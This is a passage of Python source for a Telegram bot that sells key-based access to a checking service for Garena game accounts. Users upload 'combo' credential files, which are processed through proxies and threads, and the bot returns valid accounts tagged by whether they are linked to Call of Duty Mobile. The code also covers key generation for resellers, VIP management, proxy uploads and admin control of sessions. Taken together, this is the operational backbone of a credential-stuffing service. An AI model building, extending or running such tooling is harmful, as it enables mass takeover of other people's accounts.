                new_rf=RESULTS_DIR/uid/new_ts; new_rf.mkdir(parents=True,exist_ok=True)
                with sessions_lock:
                    if uid in active_sessions: active_sessions[uid]["result_folder"]=str(new_rf)
                def _continue_bg():
                    _enqueue(uid); _checker_semaphore.acquire(); _dequeue(uid)
                    try:
                        st2=run_checker(uid,combo,new_rf,lim,threads,new_stop,btok,cid,thr_val,clf,is_resume=True)
                        u3=load_users()
                        if uid in u3:
                            u3[uid]["total_checked"]+=st2.get("total",0); save_users(u3)
                        zo2=new_rf/f"results_{uid}_{new_ts}.zip"; zp2=zip_results(new_rf,zo2)
                        note2=" (Stopped)" if new_stop.is_set() else ""
                        asyncio.run_coroutine_threadsafe(
                            deliver_results(context.bot,cid,uid,zp2,st2,combo_file=combo,note=note2),loop)
                    except Exception as ex2:
                        asyncio.run_coroutine_threadsafe(context.bot.send_message(
                            chat_id=cid,text=f"{pe(1)} <b>Error:</b> <code>{str(ex2)[:300]}</code>",parse_mode=ParseMode.HTML),loop)
                    finally:
                        _checker_semaphore.release(); inc_session(uid); del_combo(combo)
                        clear_persisted_session(uid)
                        with sessions_lock:
                            if uid in active_sessions:
                                active_sessions[uid]["status"]="done"
                                try:
                                    _ls=active_sessions[uid].get("live_stats"); _ps=active_sessions[uid].get("prev_stats",{}); _pp=active_sessions[uid].get("prev_processed",0)
                                    _cs=_ls.get_stats() if _ls else {}; _fs=dict(_cs)
                                    if _ps:
                                        for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"): _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                                    _fs["total"]=_pp+_cs.get("total",0); active_sessions[uid]["final_stats"]=_fs
                                except: pass
                threading.Thread(target=_continue_bg,daemon=True,name=f"checker-cont-{uid}").start()
                return
            else:
                note=" (Stopped)" if stop_ev.is_set() else ""
                asyncio.run_coroutine_threadsafe(
                    deliver_results(context.bot,cid,uid,zp,st_res,combo_file=combo,note=note),loop)
        except Exception as ex:
            asyncio.run_coroutine_threadsafe(context.bot.send_message(
                chat_id=cid,text=f"{pe(1)} <b>Error:</b> <code>{str(ex)[:300]}</code>",parse_mode=ParseMode.HTML),loop)
        finally:
            _status_stop.set(); _checker_semaphore.release(); inc_session(uid); del_combo(combo)
            clear_persisted_session(uid)
            with sessions_lock:
                if uid in active_sessions:
                    active_sessions[uid]["status"]="done"
                    try:
                        _ls=active_sessions[uid].get("live_stats"); _ps=active_sessions[uid].get("prev_stats",{}); _pp=active_sessions[uid].get("prev_processed",0)
                        _cs=_ls.get_stats() if _ls else {}; _fs=dict(_cs)
                        if _ps:
                            for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"): _fs[_k]=_cs.get(_k,0)+_ps.get(_k,0)
                        _fs["total"]=_pp+_cs.get("total",0); active_sessions[uid]["final_stats"]=_fs
                    except: pass

    t=threading.Thread(target=bg,daemon=True,name=f"checker-{uid}"); t.start()
    with sessions_lock: active_sessions[uid]["thread"]=t


async def _handle_start_check(update, context, uid, tg, cfg, ud):
    """Handle the Check Accounts button press with proper gate checks."""
    ok,ud2,_=await gate(update,context)
    if not ok: return
    await _do_start_check_logic(update, context, uid, cfg, ud2)


async def on_document(update,context):
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()

    # ── Admin: replacefile intercept ────────────────────────────────────
    if is_admin(tg.id,cfg):
        _REPLACEABLE_MAP = {
            "config.json":            CONFIG_FILE,
            "users.json":             USERS_FILE,
            "keys.json":              KEYS_FILE,
            "sessions_persist.json":  SESSIONS_FILE,
            "mini_admins.json":       MINI_ADMINS_FILE,
            "resellers.json":         RESELLERS_FILE,
        }
        with sessions_lock:
            _sess_rf = active_sessions.get(uid, {})
            _awaiting_rf = (
                _sess_rf.get("awaiting_replace_file") or
                _sess_rf.get("awaiting_replacefile", {}).get("fname")
            )
            _awaiting_path = (
                _sess_rf.get("awaiting_replace_path") or
                (_sess_rf.get("awaiting_replacefile") or {}).get("path")
            )
        doc = update.message.document
        # Auto-detect: if admin sends a .json file that matches a known data file,
        # handle it even without a prior /replacefiles command
        _doc_fname = doc.file_name.lower() if doc else ""
        _auto_target_path = _REPLACEABLE_MAP.get(_doc_fname)
        if _awaiting_rf == "__auto__":
            # /replacefiles with no arg — detect target from uploaded filename
            if doc and _doc_fname.endswith(".json") and _auto_target_path:
                rf_fname = _doc_fname
                rf_path  = str(_auto_target_path)
            else:
                rf_fname = None; rf_path = None
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid].pop("awaiting_replace_file", None)
                        active_sessions[uid].pop("awaiting_replace_path", None)
                known = ", ".join(f"<code>{n}</code>" for n in _REPLACEABLE_MAP)
                await update.message.reply_text(
                    f" <b>Unknown file:</b> <code>{doc.file_name if doc else '?'}</code>\n"
                    f"Replaceable files:\n{known}",
                    parse_mode=ParseMode.HTML)
                return
        elif _awaiting_rf and _awaiting_path:
            # Explicit pending replace (from /replacefiles config.json etc.)
            rf_fname = _awaiting_rf
            rf_path  = _awaiting_path
        elif _auto_target_path and doc and _doc_fname.endswith(".json"):
            # Admin sent a known .json with no prior command — auto-handle
            rf_fname = _doc_fname
            rf_path  = str(_auto_target_path)
        else:
            rf_fname = None; rf_path = None
        if rf_fname and rf_path:
            if not doc or not doc.file_name.lower().endswith(".json"):
                await update.message.reply_text(
                    " Only <b>.json</b> files accepted for data replacement.\n"
                    "Send /cancel_replace to abort.", parse_mode=ParseMode.HTML)
                return
            target_path  = Path(rf_path)
            target_fname = rf_fname
            w = await update.message.reply_text(
                f" Validating and replacing <code>{target_fname}</code>…",
                parse_mode=ParseMode.HTML)
            tmp_path = DATA_DIR / f"_tmp_{target_fname}"
            try:
                # Download to temp file
                tgf = await context.bot.get_file(doc.file_id)
                await tgf.download_to_drive(tmp_path)
                # Validate JSON before touching the real file
                with open(tmp_path, "r", encoding="utf-8") as _f:
                    new_data = json.load(_f)
                # Backup existing file
                if target_path.exists():
                    bak_path = target_path.with_suffix(".json.bak")
                    import shutil as _sh
                    _sh.copy2(str(target_path), str(bak_path))
                # Atomic replace: write validated JSON directly to target
                # (avoids partial-write corruption that caused config.json issues)
                with open(target_path, "w", encoding="utf-8") as _wf:
                    json.dump(new_data, _wf, indent=2, ensure_ascii=False)
                try: tmp_path.unlink()
                except: pass
                # Clear awaiting state (both key variants)
                with sessions_lock:
                    if uid in active_sessions:
                        active_sessions[uid].pop("awaiting_replacefile", None)
                        active_sessions[uid].pop("awaiting_replace_file", None)
                        active_sessions[uid].pop("awaiting_replace_path", None)
                new_size = target_path.stat().st_size
                key_info = (f"{len(new_data):,} entries" if isinstance(new_data, dict)
                            else f"{len(new_data):,} items" if isinstance(new_data, list)
                            else "loaded OK")
                await w.edit_text(
                    f" <b>File Replaced!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                    f" File   : <code>{target_fname}</code>\n"
                    f" Size   : <code>{new_size/1024:.1f} KB</code>\n"
                    f" Content: <code>{key_info}</code>\n"
                    f" Backup : <code>{target_fname}.bak</code> saved\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f" Use /reloadbot to apply changes.",
                    parse_mode=ParseMode.HTML)
            except json.JSONDecodeError as je:
                try: tmp_path.unlink()
                except: pass
                await w.edit_text(
                    f" <b>Invalid JSON!</b>\n<code>{str(je)[:200]}</code>\n"
                    f"File was NOT replaced. Fix the JSON and try again.",
                    parse_mode=ParseMode.HTML)
            except Exception as e:
                try: tmp_path.unlink()
                except: pass
                await w.edit_text(
                    f" <b>Replace failed:</b> <code>{str(e)[:200]}</code>",
                    parse_mode=ParseMode.HTML)
            return

    # Admin proxy upload intercept
    if is_admin(tg.id,cfg):
        with sessions_lock: aw=active_sessions.get(uid,{}).get("awaiting_proxy",False)
        if aw:
            doc=update.message.document
            if not doc or not doc.file_name.lower().endswith(".txt"):
                await update.message.reply_text(" Only <b>.txt</b> files!",parse_mode=ParseMode.HTML); return
            w=await update.message.reply_text(" Uploading…")
            dest=PROXY_DIR/doc.file_name; tgf=await context.bot.get_file(doc.file_id)
            await tgf.download_to_drive(dest)
            v=i=0
            try:
                with open(dest,"r",encoding="utf-8",errors="ignore") as f:
                    for ln in f:
                        ln=ln.strip()
                        if not ln or ln.startswith("#"): continue
                        c=ln.replace("http://","").replace("https://","").replace("socks5://","").replace("socks4://","")
                        if ":" in c: v+=1
                        else: i+=1
            except: pass
            with sessions_lock:
                if uid in active_sessions: active_sessions[uid]["awaiting_proxy"]=False
            try: await w.delete()
            except: pass
            pf=sorted(PROXY_DIR.glob("*.txt")); fl="\n".join(f"   <code>{p.name}</code>" for p in pf) or "  (none)"
            await update.message.reply_text(
                f" <b>Proxy File Uploaded!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                f" File    : <code>{doc.file_name}</code>\n Valid   : <code>{v:,}</code> proxies\n"
                f" Skipped : <code>{i:,}</code>\n━━━━━━━━━━━━━━━━━━━━\n<b>All proxy files:</b>\n{fl}",
                parse_mode=ParseMode.HTML)
            return

    allowed,ud,users=await gate(update,context)
    if not allowed: return
    with sessions_lock: sess=active_sessions.get(uid)
    if not sess or sess.get("status") not in ("waiting_file","file_received"):
        await update.message.reply_text("ℹ Use /start → tap <b>Check Accounts</b> first.",parse_mode=ParseMode.HTML); return
    doc=update.message.document
    if not doc or not doc.file_name.lower().endswith(".txt"):
        await update.message.reply_text(" Only <b>.txt</b> files!",parse_mode=ParseMode.HTML); return
    if "garena" not in doc.file_name.lower():
        await update.message.reply_text(
            f" <b>Invalid File Name!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" Your file must have <b>garena</b> in the filename.\n\n"
            f" <b>Valid Examples:</b>\n"
            f"  • <code>dreigarena.txt</code>\n"
            f"  • <code>zyblahblahgarena.txt</code>\n"
            f"  • <code>garena_combo.txt</code>\n\n"
            f" <b>Rejected:</b> <code>{doc.file_name}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Please rename your file and try again!",
            parse_mode=ParseMode.HTML); return
    # ── 10 MB file size limit (applies to ALL users including VIP) ──────
    FILE_SIZE_LIMIT_MB = 10
    FILE_SIZE_LIMIT_BYTES = FILE_SIZE_LIMIT_MB * 1024 * 1024
    doc_size = doc.file_size or 0
    if doc_size > FILE_SIZE_LIMIT_BYTES:
        size_mb = doc_size / 1024 / 1024
        await update.message.reply_text(
            f" <b>File Too Large!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" Your file : <code>{size_mb:.1f} MB</code>\n"
            f" Max allowed: <code>{FILE_SIZE_LIMIT_MB} MB</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Please split your combo file into smaller parts and upload them separately.\n"
            f"This limit applies to all users to ensure the checker can process every line properly.",
            parse_mode=ParseMode.HTML)
        return
    # ── Block new upload if user already has a file ─────────────────────
    uc=COMBO_DIR/uid
    existing_files=list(uc.glob("*.txt")) if uc.exists() else []
    # Also check active session file
    with sessions_lock: cur_sess=active_sessions.get(uid,{})
    cur_file=cur_sess.get("file","")
    has_existing = bool(existing_files) or (cur_file and Path(cur_file).exists())
    if has_existing:
        existing_name=Path(cur_file).name if cur_file and Path(cur_file).exists() else (existing_files[0].name if existing_files else "unknown")
        cur_status=cur_sess.get("status","")
        if cur_status=="checking":
            status_txt=" Currently checking — use /stop first, then /deletefile."
        else:
            status_txt="Tap below to delete it and upload a new one."
        del_kb=InlineKeyboardMarkup([[
            InlineKeyboardButton(" Delete My File",callback_data="user_delete_file")
        ]])
        await update.message.reply_text(
            f" <b>You already have a file!</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f" <code>{existing_name}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{status_txt}",
            reply_markup=del_kb if cur_status!="checking" else None,
            parse_mode=ParseMode.HTML)
        return
    uc.mkdir(parents=True,exist_ok=True); dest=uc/doc.file_name
    w=await update.message.reply_text(" Receiving file…")
    if w: track(uid,w.message_id)
    tgf=await context.bot.get_file(doc.file_id); await tgf.download_to_drive(dest)
    try:
        with open(dest,"r",encoding="utf-8",errors="ignore") as f: raw=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("==="))
    except: raw=0
    import contextlib as _cl
    with _cl.redirect_stdout(io.StringIO()), _cl.redirect_stderr(io.StringIO()):
        try: remove_duplicates_from_file(str(dest))
        except: pass
    try:
        with open(dest,"r",encoding="utf-8",errors="ignore") as f: clean=sum(1 for ln in f if ln.strip() and not ln.strip().startswith("==="))
    except: clean=raw
    removed=raw-clean; lim=load_config().get("global_limit")
    with sessions_lock:
        active_sessions[uid]["status"]="file_received"; active_sessions[uid]["file"]=str(dest)
        active_sessions[uid]["stop_event"]=threading.Event(); active_sessions[uid]["chat_id"]=update.message.chat_id
    # Persist immediately on file receive so crash/restart can recover it
    persist_session(uid, {
        "file": str(dest), "chat_id": update.message.chat_id,
        "lvl_key": active_sessions[uid].get("lvl_key","lvl_all"),
        "cf_key":  active_sessions[uid].get("cf_key","cf_both"),
        "username": update.effective_user.username or "",
        "first_name": update.effective_user.first_name or "",
        "status": "file_received",
    })
    dn=f"\n{pe(1)} Removed <code>{removed:,}</code> duplicates" if removed>0 else ""
    ln=f"\n{pe(1)} Limit: first <code>{lim:,}</code> lines only" if lim and lim<clean else ""
    try: await w.delete()
    except: pass
    m2=await update.message.reply_text(
        f"{pe(5)} <b>FILE RECEIVED!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} File  : <code>{doc.file_name}</code> {pe(2)}\n"
        f"{pe(2)} Lines : <code>{clean:,}</code>{dn}{ln} {pe(2)}\n"
        f"{pe_sep()}\n"
        f"{pe(3)} Configure below then tap <b>{BTN_START_NOW}</b>! {pe(3)}",
        reply_markup=kb_settings(uid), parse_mode=ParseMode.HTML)
    if m2: track(uid,m2.message_id)

# ════════════════════════════════════════════
#  ADMIN COMMANDS
# ════════════════════════════════════════════
@admin_or_mini_admin('generate_key')
async def cmd_generate_key(update,context):
    args=context.args or []
    usage=(" <b>Usage:</b>\n<code>/generate_key hours 24 5</code>\n<code>/generate_key days 7 10</code>\n"
           "<code>/generate_key months 1 3</code>\n<code>/generate_key lifetime 5</code>")
    try:
        if not args: raise ValueError
        dt=args[0].lower()
        if dt not in ("hours","days","months","lifetime"): raise ValueError
        if dt=="lifetime":
            if len(args)<2: raise ValueError
            mu=int(args[1]); dv=0
        else:
            if len(args)<3: raise ValueError
            dv=int(args[1]); mu=int(args[2])
            if dv<1: raise ValueError
        if mu<1: raise ValueError
    except: await update.message.reply_text(usage,parse_mode=ParseMode.HTML); return
    exp=compute_expiry(dt,dv)
    key=f"TYRANT-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:4].upper()}"
    dd={"hours":f"{dv}h","days":f"{dv}d","months":f"{dv}mo","lifetime":"Lifetime"}[dt]
    keys=load_keys()
    keys[key]={"max_users":mu,"used_by":[],"duration_type":dt,"duration_val":dv,"expires_at":exp,
               "created_at":datetime.now().isoformat(),"created_by":update.effective_user.id}
    save_keys(keys)
    await update.message.reply_text(
        f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n<code>{key}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Duration : <b>{dd}</b>\n Expires  : {fmt_expiry(exp)}\n Max users: <code>{mu}</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('generate_key')
async def cmd_reseller_gen_key(update, context):
    """Reseller version of /generate_key — same logic, accessible via /rgenkey."""
    args = context.args or []
    usage = (" <b>Usage:</b>\n<code>/rgenkey hours 24 5</code>\n<code>/rgenkey days 7 10</code>\n"
             "<code>/rgenkey months 1 3</code>\n<code>/rgenkey lifetime 5</code>")
    try:
        if not args: raise ValueError
        dt = args[0].lower()
        if dt not in ("hours", "days", "months", "lifetime"): raise ValueError
        if dt == "lifetime":
            if len(args) < 2: raise ValueError
            mu = int(args[1]); dv = 0
        else:
            if len(args) < 3: raise ValueError
            dv = int(args[1]); mu = int(args[2])
            if dv < 1: raise ValueError
        if mu < 1: raise ValueError
    except:
        await update.message.reply_text(usage, parse_mode=ParseMode.HTML); return
    exp = compute_expiry(dt, dv)
    key = f"TYRANT-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:4].upper()}"
    dd = {"hours": f"{dv}h", "days": f"{dv}d", "months": f"{dv}mo", "lifetime": "Lifetime"}[dt]
    keys = load_keys()
    keys[key] = {"max_users": mu, "used_by": [], "duration_type": dt, "duration_val": dv,
                 "expires_at": exp, "created_at": datetime.now().isoformat(),
                 "created_by": update.effective_user.id}
    save_keys(keys)
    uid_str = str(update.effective_user.id)
    reseller_log_key(uid_str, key, dt, dv, mu, exp)
    await update.message.reply_text(
        f" <b>Key Generated!</b>\n━━━━━━━━━━━━━━━━━━━━\n<code>{key}</code>\n━━━━━━━━━━━━━━━━━━━━\n"
        f" Duration : <b>{dd}</b>\n Expires  : {fmt_expiry(exp)}\n Max users: <code>{mu}</code>",
        parse_mode=ParseMode.HTML)

@admin_or_mini_admin('remove_key')
async def cmd_remove_key(update,context):
    if not context.args:
        await update.message.reply_text("Usage:\n<code>/remove_key &lt;user_id&gt;</code>\n<code>/remove_key all</code>  — all users\n<code>/remove_key vip</code>  — VIP only\n<code>/remove_key nonvip</code>  — non-VIP only",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip().lower(); users=load_users()
    if t in ("all","vip","nonvip"):
        cnt=0
        for uid2 in list(users.keys()):
            u2=users[uid2]
            is_vip=u2.get("vip",False)
            is_active=u2.get("activated",False)
            # Determine if this user matches the filter
            if t=="all" and is_active: match=True
            elif t=="vip" and is_active and is_vip: match=True
            elif t=="nonvip" and is_active and not is_vip: match=True
            else: match=False
            if match:
                users[uid2].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt+=1
                with sessions_lock:
                    if uid2 in active_sessions: active_sessions[uid2].get("stop_event",threading.Event()).set()
                try: await context.bot.send_message(chat_id=int(uid2),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                except: pass
        save_users(users)
        label={"all":"All","vip":"VIP only","nonvip":"Non-VIP only"}[t]
        await update.message.reply_text(f" <b>Keys Removed ({label})!</b>\nRevoked <code>{cnt}</code> user(s).",parse_mode=ParseMode.HTML); return
    if t not in users: await update.message.reply_text(f" <code>{t}</code> not found.",parse_mode=ParseMode.HTML); return
    was=users[t].get("activated",False)
    users[t].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); save_users(users)
    with sessions_lock:
        if t in active_sessions: active_sessions[t].get("stop_event",threading.Event()).set()
    try: await context.bot.send_message(chat_id=int(t),text=" <b>Access Revoked</b>\n\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
    except: pass
    await update.message.reply_text(f" <b>Key Removed</b>\n🆔 <code>{t}</code> @{users[t].get('username','?')}\nWas active: {'yes' if was else 'no'}",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('ban_user')
async def cmd_ban_user(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/ban_user &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); ud,users=get_or_create_user(t,"","")
    if ud.get("banned"): await update.message.reply_text(f"ℹ <code>{t}</code> already banned.",parse_mode=ParseMode.HTML); return
    users[t]["banned"]=True; save_users(users)
    with sessions_lock:
        if t in active_sessions: active_sessions[t].get("stop_event",threading.Event()).set()
    await update.message.reply_text(f" Banned: <code>{t}</code> @{users[t].get('username','?')}",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('unban_user')
async def cmd_unban_user(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/unban_user &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); users=load_users()
    if t not in users: await update.message.reply_text(f" <code>{t}</code> not found.",parse_mode=ParseMode.HTML); return
    users[t]["banned"]=False; save_users(users)
    await update.message.reply_text(f" Unbanned: <code>{t}</code>",parse_mode=ParseMode.HTML)

def _stop_user_session(uid2: str, bot, loop, reason_text: str) -> bool:
    """Force-stop a user's checking session. Returns True if was checking."""
    with sessions_lock:
        s = active_sessions.get(uid2, {})
        if s.get("status") != "checking":
            return False
        s["stop_event"].set()
        _admin_stopped.add(uid2)
        cid2 = s.get("chat_id")
    if cid2 and bot and loop:
        try:
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=cid2, parse_mode=ParseMode.HTML,
                                 text=reason_text), loop)
        except: pass
    return True


def _continue_user_session(uid2: str, bot, loop, context) -> bool:
    """Re-queue a user session that was admin-stopped. Returns True if continued."""
    with sessions_lock:
        s = active_sessions.get(uid2, {})
        if uid2 not in _admin_stopped: return False
        if s.get("status") == "checking": return False   # already running
        _admin_stopped.discard(uid2)
    # Re-trigger their session the same way auto-resume does
    fpath = s.get("file","")
    if not fpath or not Path(fpath).exists(): return False
    cid2 = s.get("chat_id")
    if not cid2: return False
    # Send resume message and restart bg thread
    if bot and loop:
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=cid2, parse_mode=ParseMode.HTML,
                text=" <b>Session Continued!</b>\nAdmin has resumed your session."), loop)
    # Set a fresh stop_event and mark checking again
    new_stop = threading.Event()
    with sessions_lock:
        active_sessions[uid2]["stop_event"] = new_stop
        active_sessions[uid2]["status"] = "checking"
    # Fire background thread
    combo = Path(fpath)
    rf = Path(s.get("result_folder", str(RESULTS_DIR/uid2/datetime.now().strftime("%Y%m%d_%H%M%S"))))
    rf.mkdir(parents=True, exist_ok=True)
    cfg2 = load_config(); users2 = load_users()
    isv2 = users2.get(uid2,{}).get("vip",False)
    lim2 = cfg2.get("vip_limit") if isv2 else cfg2.get("global_limit")
    thr2 = cfg2.get("default_threads", 5)
    def _bg2():
        _enqueue(uid2); _checker_semaphore.acquire(); _dequeue(uid2)
        with sessions_lock:
            if active_sessions.get(uid2,{}).get("status") != "checking" or new_stop.is_set():
                _checker_semaphore.release(); return
        stats2 = run_checker(uid2, str(combo), rf, lim2, thr2, new_stop,
                              cfg2["bot_token"], int(cid2),
                              [s.get("lvl_key","lvl_all")], s.get("cf_key","cf_both"),
                              is_resume=True)
        _checker_semaphore.release()
        with sessions_lock:
            if uid2 in active_sessions: active_sessions[uid2]["status"] = "done"
        if bot and loop:
            asyncio.run_coroutine_threadsafe(
                deliver_results(bot, int(cid2), uid2,
                    list(rf.glob("*.zip")) or None, stats2,
                    combo_file=str(combo)), loop)
    threading.Thread(target=_bg2, daemon=True, name=f"bg-cont-{uid2}").start()
    return True


@admin_only
async def cmd_stop_all_checking(update, context):
    """Stop ALL users currently checking."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); stopped = []
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    for uid2, s in running:
        if _stop_user_session(uid2, context.bot, loop,
            " <b>Admin stopped your session.</b>\nYour file is safe — an admin can resume it."):
            uname = users_db.get(uid2,{}).get("username","?")
            stopped.append(f"<code>{uid2}</code> @{uname}")
    if not stopped:
        await update.message.reply_text(" No active sessions to stop.", parse_mode=ParseMode.HTML); return
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Continue All", callback_data="admin_continue_all")]])
    await update.message.reply_text(
        f" <b>Stopped {len(stopped)} session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(stopped),
        reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_continue_all_checking(update, context):
    """Continue ALL admin-stopped sessions."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); continued = []
    for uid2 in list(_admin_stopped):
        if _continue_user_session(uid2, context.bot, loop, context):
            uname = users_db.get(uid2,{}).get("username","?")
            continued.append(f"<code>{uid2}</code> @{uname}")
    if not continued:
        await update.message.reply_text(" No stopped sessions to continue.", parse_mode=ParseMode.HTML); return
    await update.message.reply_text(
        f" <b>Continued {len(continued)} session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(continued), parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_vip(update, context):
    """Stop all VIP users currently checking."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); stopped = []
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    for uid2, _ in running:
        if users_db.get(uid2,{}).get("vip"):
            if _stop_user_session(uid2, context.bot, loop,
                " <b>Admin stopped your session.</b>\nYour file is safe."):
                stopped.append(f"<code>{uid2}</code> @{users_db.get(uid2,{}).get('username','?')}")
    if not stopped:
        await update.message.reply_text(" No VIP sessions running.", parse_mode=ParseMode.HTML); return
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Continue VIP", callback_data="admin_continue_vip")]])
    await update.message.reply_text(
        f" <b>Stopped {len(stopped)} VIP session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(stopped), reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_nonvip(update, context):
    """Stop all non-VIP users currently checking."""
    loop = asyncio.get_event_loop()
    users_db = load_users(); stopped = []
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    for uid2, _ in running:
        if not users_db.get(uid2,{}).get("vip") and not is_admin(int(uid2), load_config()):
            if _stop_user_session(uid2, context.bot, loop,
                " <b>Admin stopped your session.</b>\nYour file is safe."):
                stopped.append(f"<code>{uid2}</code> @{users_db.get(uid2,{}).get('username','?')}")
    if not stopped:
        await update.message.reply_text(" No non-VIP sessions running.", parse_mode=ParseMode.HTML); return
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Continue Non-VIP", callback_data="admin_continue_nonvip")]])
    await update.message.reply_text(
        f" <b>Stopped {len(stopped)} non-VIP session(s):</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(stopped), reply_markup=kb, parse_mode=ParseMode.HTML)


@admin_only
async def cmd_stop_for_user(update, context):
    """Show running sessions as buttons to stop/continue one user.
    Usage: /stopforuser  — shows all running with buttons
           /stopforuser <uid>  — stop specific user directly
    """
    loop = asyncio.get_event_loop()
    users_db = load_users()

    # Direct stop by uid
    if context.args:
        target = context.args[0].strip()
        s = active_sessions.get(target, {})
        if s.get("status") == "checking":
            _stop_user_session(target, context.bot, loop,
                " <b>Admin stopped your session.</b>\nYour file is safe.")
            uname = users_db.get(target,{}).get("username","?")
            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton(" Continue", callback_data=f"admin_cont_user_{target}")
            ]])
            await update.message.reply_text(
                f" Stopped <code>{target}</code> @{uname}",
                reply_markup=kb, parse_mode=ParseMode.HTML)
        elif target in _admin_stopped:
            _continue_user_session(target, context.bot, loop, context)
            uname = users_db.get(target,{}).get("username","?")
            await update.message.reply_text(
                f" Continued <code>{target}</code> @{uname}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(
                f" <code>{target}</code> is not currently checking.", parse_mode=ParseMode.HTML)
        return

    # Show all running sessions with stop/continue buttons
    with sessions_lock:
        running = [(uid2,s) for uid2,s in active_sessions.items() if s.get("status")=="checking"]
    paused = list(_admin_stopped)

    if not running and not paused:
        await update.message.reply_text(" No active or paused sessions.", parse_mode=ParseMode.HTML); return

    lines = [" <b>Sessions</b>\n━━━━━━━━━━━━━━━━━━━━"]
    btns = []
    for uid2, s in running:
        udata = users_db.get(uid2, {})
        uname = udata.get("username","?"); fname = udata.get("first_name","?")
        vip = "" if udata.get("vip") else ""
        ls2 = s.get("live_stats"); st2 = ls2.get_stats() if ls2 else {}
        lines.append(f"{vip} <b>{fname}</b> @{uname} (<code>{uid2}</code>) {st2.get('has_codm',0)}")
        btns.append([InlineKeyboardButton(
            f" Stop {fname} @{uname}", callback_data=f"admin_stop_user_{uid2}")])

    for uid2 in paused:
        udata = users_db.get(uid2, {})
        uname = udata.get("username","?"); fname = udata.get("first_name","?")
        lines.append(f" <b>{fname}</b> @{uname} (<code>{uid2}</code>) — paused by admin")
        btns.append([InlineKeyboardButton(
            f" Continue {fname} @{uname}", callback_data=f"admin_cont_user_{uid2}")])

    btns.append([
        InlineKeyboardButton(" Stop All",     callback_data="admin_stop_all"),
        InlineKeyboardButton(" Continue All", callback_data="admin_continue_all"),
    ])
    await update.message.reply_text(
        "\n".join(lines), reply_markup=InlineKeyboardMarkup(btns), parse_mode=ParseMode.HTML)


@admin_only
async def cmd_lock_all(update,context):
    cfg=load_config(); cfg["locked"]=True; save_config(cfg)
    users=load_users(); stopped=0
    with sessions_lock:
        for uid2,s in active_sessions.items():
            if s.get("status")=="checking" and not users.get(uid2,{}).get("vip"):
                s["stop_event"].set(); stopped+=1
                # Notify the affected user
                cid2=s.get("chat_id")
                if cid2:
                    try:
                        asyncio.get_event_loop().create_task(
                            update.get_bot().send_message(
                                chat_id=cid2,parse_mode=ParseMode.HTML,
                                text=" <b>Bot has been locked by admin.</b>\n"
                                     "Your session was paused. Your file is safe — "
                                     "it will resume when the bot is unlocked."))
                    except: pass
    await update.message.reply_text(
        f" <b>Bot Locked!</b> Paused <code>{stopped}</code> session(s).\n"
        f"Files are kept — users can resume after /unlockAll.",
        parse_mode=ParseMode.HTML)

@admin_only
async def cmd_unlock_all(update,context):
    cfg=load_config(); cfg["locked"]=False; save_config(cfg)
    await update.message.reply_text(" <b>Bot Unlocked!</b>",parse_mode=ParseMode.HTML)

@admin_or_mini_admin('addvip')
async def cmd_add_vip(update,context):
    if not context.args: await update.message.reply_text("Usage: <code>/addvip &lt;id&gt;</code>",parse_mode=ParseMode.HTML); return
    t=context.args[0].strip(); ud,users=get_or_create_user(t,"","")
    ud["vip"]=True; ud["activated"]=True; save_users(users)
    await update.message.reply_text(f" VIP granted: <code>{t}</code>",parse_mode=ParseMode.HTML)

